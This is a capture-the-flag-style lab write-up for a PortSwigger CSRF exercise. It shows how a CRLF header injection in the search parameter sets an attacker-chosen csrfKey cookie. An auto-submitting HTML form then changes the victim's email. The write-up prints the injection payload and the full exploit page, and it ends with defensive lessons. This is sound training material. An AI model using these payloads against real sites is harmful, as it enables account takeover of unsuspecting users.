# Lab: CSRF where token is tied to non-session cookie

## Objective

Exploit a CSRF vulnerability where the CSRF token is tied to a non-session cookie. The goal is to change the victim's email address without their interaction.

## Vulnerability

The application uses two CSRF-related values:

- `csrf` token submitted with the email-change request.
- `csrfKey` stored in a cookie.

The server checks that the submitted CSRF token corresponds to the `csrfKey` cookie. However, the `csrfKey` cookie is not tied to the user's session and can be overwritten through the application's search functionality.

This allows an attacker to set a known `csrfKey`, generate/use the corresponding CSRF token, and forge the email-change request.

## Steps

### 1. Capture the email-change request

Intercept the email-change request in Burp Suite:

    POST /my-account/change-email HTTP/2
    Cookie: session=...; csrfKey=...
    Content-Type: application/x-www-form-urlencoded

    email=attacker@gmail.com&csrf=...

The request successfully changes the email when the correct CSRF token and `csrfKey` are supplied.

### 2. Confirm that the token is not tied to the session

Change the `csrfKey` and use a corresponding CSRF token while keeping the session unchanged.

The email-change request still succeeds. This shows that the CSRF validation depends on the relationship between the token and `csrfKey`, rather than securely binding the token to the user's session.

### 3. Inject the `csrfKey` cookie

The search functionality can be used to inject a `Set-Cookie` response header.

The relevant request is:

    GET /search?test=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_VALUE;%20SameSite=None HTTP/2

The response sets the attacker-controlled `csrfKey` cookie.

### 4. Create the CSRF exploit

Create an exploit on the PortSwigger exploit server containing a form that submits the email-change request automatically.

The exploit can use:

    <html>
    <body>
        <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@gmail.com">
            <input type="hidden" name="csrf" value="MATCHING_CSRF_TOKEN">
        </form>

        <img src="https://LAB-ID.web-security-academy.net/search?test=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_VALUE;%20SameSite=None"
             onerror="document.forms[0].submit()">
    </body>
    </html>

The injected request first sets the victim's `csrfKey` cookie. The form then automatically submits the email-change request using the matching CSRF token.

### 5. Deliver the exploit

Store the exploit on the exploit server and click **Deliver exploit to victim**.

When the victim visits the exploit:

1. The injected request overwrites the victim's `csrfKey`.
2. The form automatically submits the email-change request.
3. The supplied CSRF token matches the attacker-controlled `csrfKey`.
4. The server accepts the request.
5. The victim's email address is changed.

## Result

The CSRF protection is bypassed because the application's CSRF token is tied to a separate `csrfKey` cookie rather than securely to the user's session. Since the attacker can overwrite that cookie and provide the corresponding token, a forged email-change request is accepted.

## Key Learning

- CSRF tokens should be securely bound to the user's session.
- A CSRF token tied only to a separate cookie is unsafe if that cookie can be overwritten.
- Cookie injection can undermine CSRF protections based on double-submit-style tokens.
- Security tokens should not rely on attacker-controllable cookie values.
- Proper CSRF defenses should use unpredictable, session-bound tokens and appropriate cookie security controls.
